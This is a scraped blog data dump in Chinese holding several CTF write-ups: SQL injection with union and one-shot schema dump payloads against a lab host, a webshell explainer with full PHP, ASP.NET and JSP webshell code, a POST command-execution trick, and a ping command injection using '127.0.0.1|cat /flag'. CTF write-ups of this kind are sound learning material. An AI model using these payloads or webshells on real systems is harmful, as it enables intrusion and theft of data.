)\n\n\n1\n2\n3\n4\n\n\n然后output positions填2的情况返回值如下\n\nexecuted operations:\nselect username,password from users where id = ((((((11)))))) union select 1,group_concat(schema_name) from information_schema.schemata -- ))))))))))))\n\narray ( [0] => array ( [username] => 1 [password] => information_schema,mysql,ctftraining,performance_schema,test,ctf ) )\n\n\n1\n2\n3\n4\n\n\n我们怀疑是在ctftraining、test、ctf这三个库最有可能存放flag，所以我们去爆这三个库的表名\n\n\n\n把union的部分都删掉，换成爆破表名的部分，选择dump tables from database\n\n\n\n-- 默认是database()\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+))))))\n-- 我们手动选择库名\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' --+))))))\n\n\n1\n2\n3\n4\n\n\n执行之后，我们得到如下结果\n\nexecuted operations:\nselect username,password from users where id = ((((((11)))))) union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' -- ))))))))))))\n\narray ( [0] => array ( [username] => 1 [password] => flag,news,users ) )\n\n\n1\n2\n3\n4\n\n\n下一步我们爆表里面的字段名：\n\n我们在hackbar的sqli选项里选择mysql，然后选择dump columns from database，然后将库名替换为ctftraining\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' --+))))))\n\n\n1\n\n\n执行之后，我们得到如下结果\n\nexecuted operations:\nselect username,password from users where id = ((((((11)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' -- ))))))))))))\n\narray ( [0] => array ( [username] => 1 [password] => flag,id,title,content,time,id,username,password,ip,time ) )\n\n\n1\n2\n3\n4\n\n\n最后我们使用联合查询的方式，直接将flag这个字段的值拿出来\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,flag from ctftraining.flag --+))))))\n\n\n1\n\n\n这句话的意思是，我们查询ctftraining库下的flag表的flag字段\n\nexecuted operations:\nselect username,password from users where id = ((((((11)))))) union select 1,flag from ctftraining.flag -- ))))))))))))\n\narray ( [0] => array ( [username] => 1 [password] => nssctf{6090c84c-7585-4fb7-989d-598b04e7ba82} ) )\n\n\n1\n2\n3\n4\n\n\n\n# 方法2：手工注入 dios（dump in one shot）\n\n我们除了第一种的方法，先爆破库名，然后爆破表名，然后爆破列名，最后用列名做查询。我们还可以使用一波流，直接将整个库都拿下来，具体方法如下\n\n\n\n选择dump in one shot，会生成hackbar的预处理语句（需要注意生成的这句话是一个列名，需要和1对齐），我们直接点运行\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,\n\n(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0d,0x0a,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7c))))a) \n\n--+))))))\n\n\n1\n2\n3\n4\n5\n\n\n此时得到的回显会很长，我们需要筛查其中的内容，找到flag这个表和flag的flag字段\n\nexecuted operations:\nselect username,password from users where id = ((((((11)))))) union select 1,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0d,0x0a,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7c))))a) -- ))))))))))))\n\n\n---内容仅展示部分\narray ( [0] => array ( [username] => 1 [password] => [ information_schema ] > all_plugins > plugin_name| [ information_schema ] > all_plugins > plugin_version| [ information_schema ] > all_plugins > plugin_status| [ information_schema ] > all_plugins > plugin_type| [ information_schema ] > all_plugins > plugin_type_version| [ information_schema ] > all_plugins > plugin_library| [ information_schema ] > all_plugins > plugin_library_version| [ information_schema ] > all_plugins > plugin_author| [ information_schema ] > all_plugins > plugin_description| [ information_schema ] > all_plugins > plugin_license| [ information_schema ] > all_plugins > load_option| [ information_schema ] > all_plugins > plugin_maturity| [ information_schema ] > all_plugins > plugin_auth_version| [ information_schema ] > applicable_roles > grantee| [ information_schema ] > applicable_roles > role_name| [ information_schema ] > applicable_roles > is_grantable| [ information_schema ] > applicable_roles > is_default| [ information_schema ] > character_sets > character_set_name| [ information_schema ] > character_sets > default_collate_name| [ information_schema ] > character_sets > description| [ information_schema ] > character_sets > maxlen| [ information_schema ] > check_constraints > constraint_catalog| [ information_schema ] > check_constraints > constraint_schema| [ information_schema ] > check_constraints > table_name| [ information_schema ] > check_constraints > constraint_name| [ information_schema ] > check_constraints > check_clause| [ information_schema ] > collations > collation_name| [ information_schema ] > collations > character_set_name| [ information_schema ] > collations > id| [ \n\n\n1\n2\n3\n4\n5\n6\n\n\n最后我们使用联合查询的方式，直接将flag这个字段的值拿出来\n\nhttp://node5.anna.nssctf.cn:22679/?id=11)))))) union select 1,flag from ctftraining.flag --+))))))\n\n\n1\n\n\n\n# 彩蛋：输入2，然后执行\n\nexecuted operations:\nselect username,password from users where id = ((((((2))))))\n\narray ( [0] => array ( [username] => fake_flag [password] => f1rst_to_th3_eggggggggg!} (4/4) ) )\n\n\n1\n2\n3\n4\n\n\n\n# 总结：需要学好sql基础，尤其是union操作符的用法",charsets:{cjk:!0},lastUpdated:"2024/11/28, 20:38:58",lastUpdatedTimestamp:1732797538e3},{title:"吾杯网络安全技能大赛[Misc方向]-Sign签到题",frontmatter:{title:"吾杯网络安全技能大赛[Misc方向]-Sign签到题",date:"2024-12-01T00:00:00.000Z",tags:["CTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-12-01-1-CTF-MiscSign-WtiteUp.html",relativePath:"views/essay/2024-12-01-1-CTF-MiscSign-WtiteUp.md",key:"v-00a044d4",path:"/views/essay/2024-12-01-1-CTF-MiscSign-WtiteUp.html",headers:[{level:3,title:"题目描述：浅浅签个到吧",slug:"题目描述-浅浅签个到吧",normalizedTitle:"题目描述：浅浅签个到吧",charIndex:44},{level:3,title:"考点：十六进制编码&编程基础",slug:"考点-十六进制编码-编程基础",normalizedTitle:"考点：十六进制编码&amp;编程基础",charIndex:null},{level:3,title:"预期解：使用Python将16进制编码转化为字符",slug:"预期解-使用python将16进制编码转化为字符",normalizedTitle:"预期解：使用python将16进制编码转化为字符",charIndex:77}],excerpt:'<Boxx/>\n<p>参加了吾杯网络安全技能大赛，这是一道Misc方向的简单题，这是我的第23题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>网址【<a href="https://www.wucup.net/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>无</td>\n<td>Sign</td>\n<td>Misc</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：浅浅签个到吧 考点：十六进制编码&编程基础 预期解：使用Python将16进制编码转化为字符",content:"参加了吾杯网络安全技能大赛，这是一道Misc方向的简单题，这是我的第23题\n\n\n\n * 题目描述：浅浅签个到吧\n * 考点：十六进制编码&编程基础\n * 预期解：使用Python将16进制编码转化为字符\n\n\n\n * 网址【传送门】\n\n题目编号   题目名称   题目方向   难度\n无      Sign   Misc   1\n\n\n# 题目23：Sign\n\n\n# 题目描述：浅浅签个到吧\n\n\n# 考点：十六进制编码&编程基础\n\n\n# 预期解：使用Python将16进制编码转化为字符\n\nhex_str = \"57754375707B64663335376434372D333163622D343261382D616130632D3634333036333464646634617D\"\ndecoded_bytes = bytes.fromhex(hex_str)\nprint(decoded_bytes.decode('utf-8'))\n\n\n1\n2\n3\n\n\n运行后得到WuCup{df357d47-31cb-42a8-aa0c-6430634ddf4a}\n\n同样也可以用如在线工具等完成16进制到字符的转换【传送门】",normalizedContent:"参加了吾杯网络安全技能大赛，这是一道misc方向的简单题，这是我的第23题\n\n\n\n * 题目描述：浅浅签个到吧\n * 考点：十六进制编码&编程基础\n * 预期解：使用python将16进制编码转化为字符\n\n\n\n * 网址【传送门】\n\n题目编号   题目名称   题目方向   难度\n无      sign   misc   1\n\n\n# 题目23：sign\n\n\n# 题目描述：浅浅签个到吧\n\n\n# 考点：十六进制编码&编程基础\n\n\n# 预期解：使用python将16进制编码转化为字符\n\nhex_str = \"57754375707b64663335376434372d333163622d343261382d616130632d3634333036333464646634617d\"\ndecoded_bytes = bytes.fromhex(hex_str)\nprint(decoded_bytes.decode('utf-8'))\n\n\n1\n2\n3\n\n\n运行后得到wucup{df357d47-31cb-42a8-aa0c-6430634ddf4a}\n\n同样也可以用如在线工具等完成16进制到字符的转换【传送门】",charsets:{cjk:!0},lastUpdated:"2024/12/15, 11:33:34",lastUpdatedTimestamp:1734233614e3},{title:"吾杯网络安全技能大赛[Web方向]-Sign签到题",frontmatter:{title:"吾杯网络安全技能大赛[Web方向]-Sign签到题",date:"2024-12-02T00:00:00.000Z",tags:["CTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-12-02-1-CTF-WebSign-WriteUp.html",relativePath:"views/essay/2024-12-02-1-CTF-WebSign-WriteUp.md",key:"v-661e1f5e",path:"/views/essay/2024-12-02-1-CTF-WebSign-WriteUp.html",headers:[{level:3,title:"题目描述：POST浅浅签个到吧",slug:"题目描述-post浅浅签个到吧",normalizedTitle:"题目描述：post浅浅签个到吧",charIndex:46},{level:3,title:"考点：WebShell的应用",slug:"考点-webshell的应用",normalizedTitle:"考点：webshell的应用",charIndex:65},{level:3,title:"预期解：通过WebShell的方式去执行命令",slug:"预期解-通过webshell的方式去执行命令",normalizedTitle:"预期解：通过webshell的方式去执行命令",charIndex:83},{level:2,title:"一、定义",slug:"一、定义",normalizedTitle:"一、定义",charIndex:740},{level:2,title:"二、常见类型及操作示例",slug:"二、常见类型及操作示例",normalizedTitle:"二、常见类型及操作示例",charIndex:834},{level:3,title:"PHP WebShell",slug:"php-webshell",normalizedTitle:"php webshell",charIndex:856},{level:3,title:"ASP/ASP.NET WebShell",slug:"asp-asp-net-webshell",normalizedTitle:"asp/asp.net webshell",charIndex:1498},{level:3,title:"JSP WebShell",slug:"jsp-webshell",normalizedTitle:"jsp webshell",charIndex:2352},{level:2,title:"三、使用场景及目的",slug:"三、使用场景及目的",normalizedTitle:"三、使用场景及目的",charIndex:3357}],excerpt:'<Boxx/>\n<p>参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第24题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>网址【<a href="https://www.wucup.net/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>无</td>\n<td>Sign</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：POST浅浅签个到吧 考点：WebShell的应用 预期解：通过WebShell的方式去执行命令 一、定义 二、常见类型及操作示例 PHP WebShell ASP/ASP.NET WebShell JSP WebShell 三、使用场景及目的",content:'参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第24题\n\n\n\n * 题目描述：POST浅浅签个到吧\n * 考点：WebShell的应用\n * 预期解：通过WebShell的方式去执行命令\n\n\n\n * 网址【传送门】\n\n题目编号   题目名称   题目方向   难度\n无      Sign   Web    1\n\n\n# 题目24：Sign\n\n\n# 题目描述：POST浅浅签个到吧\n\n\n# 考点：WebShell的应用\n\n\n# 预期解：通过WebShell的方式去执行命令\n\n首先进入靶机，页面提示passwd:sgin\n\n原本一开始想的是通过HackBar给目标传一个passwd的参数，参数的值是sgin，结果发现不可以，还是返回了passwd:sgin。尝试了多种方式，比如把sgin改成了sign等，种种方法都不行。\n\n比赛结束后，参考了跑CHTXRT师傅的WriteUp，才发现是直接用WebShell的方式发一个POST请求，参数名是sgin，参数值直接就是system(ls /)等命令，这位师傅的WriteUp对我的启发很大，之前虽然学了WebShell的用法，但没有想到这道题是用WebShell来完成的。\n\nsgin=system("ls /");\n\n\n1\n\n\n\n\n同理，我们看到目录下有个flag文件，直接cat该文件即可\n\nsgin=system("cat /flag");\n\n\n1\n\n\n看了老师傅的WP，感受颇多，最近虽然刷了一些入门题单，但感觉都没形成条件反射，缺少很多基础知识，对于提示不敏感，以及对入门题单讲过的知识点和方法不熟悉，所以导致这道Web签到题都没有做出来\n\n\n> # WebShell 简介\n> \n> \n> # 一、定义\n> \n> WebShell 是一种特殊的脚本文件，它允许攻击者通过网页浏览器与目标服务器进行交互，进而在服务器端执行各种命令，实现对服务器的一定程度的控制。\n> \n> \n> # 二、常见类型及操作示例\n> \n> \n> # PHP WebShell\n> \n> 在基于 PHP 的网站环境中较为常见。以下是一个简单的 PHP WebShell 示例代码：\n> \n> <?php\n> if(isset($_GET[\'cmd\'])){\n>    $cmd = $_GET[\'cmd\'];\n>    system($cmd);\n>    echo $cmd.\'的执行结果：<br>\';\n>    echo \'<pre>\'.shell_exec($cmd).\'</pre>\';\n> }\n> ?>\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> \n> \n> 在这个示例中：\n> \n>  * 首先通过 isset($_GET[\'cmd\']) 检查是否通过 GET 请求传递了名为 cmd 的参数。\n>  * 如果存在该参数，就将其值赋给变量 $cmd。\n>  * 然后使用 system($cmd) 或 shell_exec($cmd) 函数来执行这个命令。system 函数会直接执行命令并输出结果到浏览器（但可能不会完整返回所有输出内容），而 shell_exec 函数执行命令后会返回完整的输出结果，这里通过 <pre> 标签对输出进行格式化展示，以便更清晰地查看。\n> \n> 攻击者可以通过构造类似 http://target.com/shell.php?cmd=ls -l 的 URL 来执行服务器上的 ls -l 命令，查看指定目录下文件的详细信息等操作。\n> \n> \n> # ASP/ASP.NET WebShell\n> \n> 适用于基于微软的 IIS 服务器和 ASP/ASP.NET技术的网站。示例代码如下（简化示例）：\n> \n> <%@ Page Language="C#" %>\n> <%@ Import Namespace="System.Diagnostics" %>\n> <%\n> if(Request.QueryString["cmd"]!= null)\n> {\n>    string cmd = Request.QueryString["cmd"];\n>    ProcessStartInfo psi = new ProcessStartInfo(cmd);\n>    psi.UseShellExecute = false;\n>    psi.RedirectStandardOutput = true;\n>    Process p = Process.Start(psi);\n>    Response.Write(p.StandardOutput.ReadToEnd());\n> }\n> %>\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n> 11\n> 12\n> 13\n> \n> \n> 在这个ASP.NET的示例中：\n> \n>  * 首先判断是否通过 QueryString（类似 GET 请求方式）接收到名为 cmd 的参数。\n>  * 若接收到，将其赋值给变量 cmd。\n>  * 然后创建一个 ProcessStartInfo 对象来设置要执行的命令相关信息，通过 Process.Start 启动该命令的执行，并将执行结果通过 Response.Write 输出到浏览器，供攻击者查看。\n> \n> 攻击者可通过构造如 http://targetserver.com/shell.asp?cmd=dir 的 URL 来执行服务器上的 dir 命令，获取当前目录下的文件列表信息。\n> \n> \n> # JSP WebShell\n> \n> 在 Java Web 应用环境下使用。示例代码如下：\n> \n> <%@ page import="java.io.BufferedReader,java.io.InputStreamReader,java.io.IOException,java.lang.ProcessBuilder" %>\n> <%\n> if(request.getParameter("cmd")!= null)\n> {\n>    String cmd = request.getParameter("cmd");\n>    ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));\n>    pb.redirectErrorStream(true);\n>    Process p = pb.start();\n>    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n>    String line;\n>    while ((line = br.readLine())!= null)\n>    {\n>        out.println(line);\n>    }\n>    br.close();\n> }\n> %>\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n> 11\n> 12\n> 13\n> 14\n> 15\n> 16\n> 17\n> \n> \n> 在这个 JSP WebShell 示例中：\n> \n>  * 同样先检查是否通过 request.getParameter("cmd") 接收到名为 cmd 的参数。\n>  * 若有，将其赋值给变量 cmd。\n>  * 接着使用 ProcessBuilder 来构建要执行的命令，并启动执行过程。通过 BufferedReader 读取命令执行的输出结果，并逐行输出到浏览器页面上，供攻击者查看执行情况。\n> \n> 攻击者可通过构造如 http://targetserver.com/shell.jsp?cmd=ls -al 的 URL 来执行服务器上的 ls -al 命令，查看目录下文件的详细信息。\n> \n> \n> # 三、使用场景及目的\n> \n> WebShell 通常被攻击者用于在成功入侵目标服务器后，进一步深入控制服务器。例如，通过执行文件操作命令来查看、修改或删除服务器上的文件；执行系统命令获取服务器的系统信息、网络配置等；或者利用服务器的资源进行其他恶意活动，如发动 DDoS 攻击等。在 CTF 比赛中，了解 WebShell 有助于理解某些涉及服务器攻击与防御相关的题目，帮助选手更好地分析题目思路和找到解题方法。',normalizedContent:'参加了第一届吾杯网络安全技能大赛，这是一道web方向的签到题，这是我的第24题\n\n\n\n * 题目描述：post浅浅签个到吧\n * 考点：webshell的应用\n * 预期解：通过webshell的方式去执行命令\n\n\n\n * 网址【传送门】\n\n题目编号   题目名称   题目方向   难度\n无      sign   web    1\n\n\n# 题目24：sign\n\n\n# 题目描述：post浅浅签个到吧\n\n\n# 考点：webshell的应用\n\n\n# 预期解：通过webshell的方式去执行命令\n\n首先进入靶机，页面提示passwd:sgin\n\n原本一开始想的是通过hackbar给目标传一个passwd的参数，参数的值是sgin，结果发现不可以，还是返回了passwd:sgin。尝试了多种方式，比如把sgin改成了sign等，种种方法都不行。\n\n比赛结束后，参考了跑chtxrt师傅的writeup，才发现是直接用webshell的方式发一个post请求，参数名是sgin，参数值直接就是system(ls /)等命令，这位师傅的writeup对我的启发很大，之前虽然学了webshell的用法，但没有想到这道题是用webshell来完成的。\n\nsgin=system("ls /");\n\n\n1\n\n\n\n\n同理，我们看到目录下有个flag文件，直接cat该文件即可\n\nsgin=system("cat /flag");\n\n\n1\n\n\n看了老师傅的wp，感受颇多，最近虽然刷了一些入门题单，但感觉都没形成条件反射，缺少很多基础知识，对于提示不敏感，以及对入门题单讲过的知识点和方法不熟悉，所以导致这道web签到题都没有做出来\n\n\n> # webshell 简介\n> \n> \n> # 一、定义\n> \n> webshell 是一种特殊的脚本文件，它允许攻击者通过网页浏览器与目标服务器进行交互，进而在服务器端执行各种命令，实现对服务器的一定程度的控制。\n> \n> \n> # 二、常见类型及操作示例\n> \n> \n> # php webshell\n> \n> 在基于 php 的网站环境中较为常见。以下是一个简单的 php webshell 示例代码：\n> \n> <?php\n> if(isset($_get[\'cmd\'])){\n>    $cmd = $_get[\'cmd\'];\n>    system($cmd);\n>    echo $cmd.\'的执行结果：<br>\';\n>    echo \'<pre>\'.shell_exec($cmd).\'</pre>\';\n> }\n> ?>\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> \n> \n> 在这个示例中：\n> \n>  * 首先通过 isset($_get[\'cmd\']) 检查是否通过 get 请求传递了名为 cmd 的参数。\n>  * 如果存在该参数，就将其值赋给变量 $cmd。\n>  * 然后使用 system($cmd) 或 shell_exec($cmd) 函数来执行这个命令。system 函数会直接执行命令并输出结果到浏览器（但可能不会完整返回所有输出内容），而 shell_exec 函数执行命令后会返回完整的输出结果，这里通过 <pre> 标签对输出进行格式化展示，以便更清晰地查看。\n> \n> 攻击者可以通过构造类似 http://target.com/shell.php?cmd=ls -l 的 url 来执行服务器上的 ls -l 命令，查看指定目录下文件的详细信息等操作。\n> \n> \n> # asp/asp.net webshell\n> \n> 适用于基于微软的 iis 服务器和 asp/asp.net技术的网站。示例代码如下（简化示例）：\n> \n> <%@ page language="c#" %>\n> <%@ import namespace="system.diagnostics" %>\n> <%\n> if(request.querystring["cmd"]!= null)\n> {\n>    string cmd = request.querystring["cmd"];\n>    processstartinfo psi = new processstartinfo(cmd);\n>    psi.useshellexecute = false;\n>    psi.redirectstandardoutput = true;\n>    process p = process.start(psi);\n>    response.write(p.standardoutput.readtoend());\n> }\n> %>\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n> 11\n> 12\n> 13\n> \n> \n> 在这个asp.net的示例中：\n> \n>  * 首先判断是否通过 querystring（类似 get 请求方式）接收到名为 cmd 的参数。\n>  * 若接收到，将其赋值给变量 cmd。\n>  * 然后创建一个 processstartinfo 对象来设置要执行的命令相关信息，通过 process.start 启动该命令的执行，并将执行结果通过 response.write 输出到浏览器，供攻击者查看。\n> \n> 攻击者可通过构造如 http://targetserver.com/shell.asp?cmd=dir 的 url 来执行服务器上的 dir 命令，获取当前目录下的文件列表信息。\n> \n> \n> # jsp webshell\n> \n> 在 java web 应用环境下使用。示例代码如下：\n> \n> <%@ page import="java.io.bufferedreader,java.io.inputstreamreader,java.io.ioexception,java.lang.processbuilder" %>\n> <%\n> if(request.getparameter("cmd")!= null)\n> {\n>    string cmd = request.getparameter("cmd");\n>    processbuilder pb = new processbuilder(cmd.split(" "));\n>    pb.redirecterrorstream(true);\n>    process p = pb.start();\n>    bufferedreader br = new bufferedreader(new inputstreamreader(p.getinputstream()));\n>    string line;\n>    while ((line = br.readline())!= null)\n>    {\n>        out.println(line);\n>    }\n>    br.close();\n> }\n> %>\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n> 11\n> 12\n> 13\n> 14\n> 15\n> 16\n> 17\n> \n> \n> 在这个 jsp webshell 示例中：\n> \n>  * 同样先检查是否通过 request.getparameter("cmd") 接收到名为 cmd 的参数。\n>  * 若有，将其赋值给变量 cmd。\n>  * 接着使用 processbuilder 来构建要执行的命令，并启动执行过程。通过 bufferedreader 读取命令执行的输出结果，并逐行输出到浏览器页面上，供攻击者查看执行情况。\n> \n> 攻击者可通过构造如 http://targetserver.com/shell.jsp?cmd=ls -al 的 url 来执行服务器上的 ls -al 命令，查看目录下文件的详细信息。\n> \n> \n> # 三、使用场景及目的\n> \n> webshell 通常被攻击者用于在成功入侵目标服务器后，进一步深入控制服务器。例如，通过执行文件操作命令来查看、修改或删除服务器上的文件；执行系统命令获取服务器的系统信息、网络配置等；或者利用服务器的资源进行其他恶意活动，如发动 ddos 攻击等。在 ctf 比赛中，了解 webshell 有助于理解某些涉及服务器攻击与防御相关的题目，帮助选手更好地分析题目思路和找到解题方法。',charsets:{cjk:!0},lastUpdated:"2024/12/15, 11:33:34",lastUpdatedTimestamp:1734233614e3},{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3873",frontmatter:{title:"NSSCTF入门题单[LitCTF 2023]WriteUP-NSSCTF-3873",date:"2024-11-30T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-30-1-CTF-3873-WriteUp.html",relativePath:"views/essay/2024-11-30-1-CTF-3873-WriteUp.md",key:"v-0600c0b4",path:"/views/essay/2024-11-30-1-CTF-3873-WriteUp.html",headers:[{level:3,title:"题目描述：看看能PING出什么",slug:"题目描述-看看能ping出什么",normalizedTitle:"题目描述：看看能ping出什么",charIndex:42},{level:3,title:"考点：前端禁用&命令执行",slug:"考点-前端禁用-命令执行",normalizedTitle:"考点：前端禁用&amp;命令执行",charIndex:null},{level:3,title:"预期解：",slug:"预期解",normalizedTitle:"预期解：",charIndex:77},{level:3,title:"方法一：JS禁用",slug:"方法一-js禁用",normalizedTitle:"方法一：js禁用",charIndex:85},{level:3,title:"方法二：JS Hook",slug:"方法二-js-hook",normalizedTitle:"方法二：js hook",charIndex:97},{level:3,title:"方法三：用HackBar直接提交到后端",slug:"方法三-用hackbar直接提交到后端",normalizedTitle:"方法三：用hackbar直接提交到后端",charIndex:112},{level:3,title:"方法四：使用BurpSuite抓包修改",slug:"方法四-使用burpsuite抓包修改",normalizedTitle:"方法四：使用burpsuite抓包修改",charIndex:135}],excerpt:'<Boxx/>\n<p>[LitCTF 2023]这套题是Web方向入门题单，这是我的第22题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP【<a href="https://dqgom7v7dl.feishu.cn/docx/WdHvd735koqwJxxulA2cv4K4nKf" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>主办方WriteUP视频【<a href="https://www.bilibili.com/video/BV1sm4y187EK" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>3873</td>\n<td>Ping</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：看看能PING出什么 考点：前端禁用&命令执行 预期解： 方法一：JS禁用 方法二：JS Hook 方法三：用HackBar直接提交到后端 方法四：使用BurpSuite抓包修改",content:'[LitCTF 2023]这套题是Web方向入门题单，这是我的第22题\n\n\n\n * 题目描述：看看能PING出什么\n * 考点：前端禁用&命令执行\n * 预期解：\n * 方法一：JS禁用\n * 方法二：JS Hook\n * 方法三：用HackBar直接提交到后端\n * 方法四：使用BurpSuite抓包修改\n\n\n\n * 题单【传送门】\n * 主办方WriteUP【传送门】\n * 主办方WriteUP视频【传送门】\n\n题目编号   题目名称   题目方向   难度\n3873   Ping   Web    1\n\n\n# 题目22：Ping\n\n\n# 题目描述：看看能PING出什么\n\n\n# 考点：前端禁用&命令执行\n\n\n# 预期解：\n\n进入页面后，我们看到提示Ping一下\n\n\n\n我们先尝试ping了一下127.0.0.1，返回了正常ping的结果\n\nPING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.047 ms\n64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.055 ms\n64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.045 ms\n64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.052 ms\n64 bytes from 127.0.0.1: seq=4 ttl=42 time=0.057 ms\n64 bytes from 127.0.0.1: seq=5 ttl=42 time=0.060 ms\n--- 127.0.0.1 ping statistics ---\n6 packets transmitted, 6 packets received, 0% packet loss\nround-trip min/avg/max = 0.045/0.052/0.060 ms\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n我们尝试使用命令拼接，也就是在ip地址后加上 “|” ，提示“敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦”\n\n除此之外，还应该点开F12审查元素，这是我们要养成的良好习惯之一，可以看到这里是在前端做了校验，只能输入数字、点这两种符号，如果违规输入前端就会直接拦截。\n\n  <body>\n    <div class="container">\n      <h1>试着Ping一下吧</h1>\n      <script type="text/javascript">\n  function check_ip(){\n    let ip = document.getElementById(\'command\').value;\n    let re = /^(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)$/;\n    if(re.test(ip.trim())){\n      return true;\n    }\n    alert(\'敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦\');\n    return false;\n  }\n<\/script>\n      <form action="" method="POST" onsubmit="return check_ip()">\n          <input id="command" name="command" type="text" placeholder="Enter an IP address"/>\n          <input name="ping" type="submit" value="Ping"/>\n      </form>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n此时我们有多种方式可以绕过前端的校验\n\n\n# 方法一：JS禁用\n\n在F12页面点击设置，将JavaScript禁用掉，这种方法是不会影响我们提交的，因为提交是Form表单提交的，和js没有关系，js只是校验它是不是ip地址\n\n\n\n在禁用掉js以后，我们重新拼接ip地址和命令，用管道符连接\n\n127.0.0.1|ls /\n\n\n1\n\n\n\n\n可以看到flag文件就在根目录，直接输入命令展示flag内容即可看到flag内容\n\n127.0.0.1|cat /flag\n\n\n1\n\n\n> 这种方法要记得常用的命令拼接方法，比如最常用的是管道符\n> \n> command1 && command2 先执行 command1，如果为真，再执行 command2\n> \n> command1 | command2 只执行 command2\n> \n> command1 & command2 先执行 command2 后执行 command1\n> \n> command1 || command2 先执行 command1，如果为假，再执行 command2\n\n\n# 方法二：JS Hook\n\n我们在用F12审查元素，审查JS代码，函数名是check_ip\n\n<script type="text/javascript">\n  function check_ip(){\n    let ip = document.getElementById(\'command\').value;\n    let re = /^(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)$/;\n    if(re.test(ip.trim())){\n      return true;\n    }\n    alert(\'敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦\');\n    return false;\n  }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n复制这个函数名，我们到F12开发者工具的Console控制台页面\n\n将check_ip这个函数置为空，其实就是将默认的函数名name和参数params删掉，回车即可\n\n\n\n然后同方法一相同，使用管道符在ip地址后拼接命令，即可拿到flag\n\n\n# 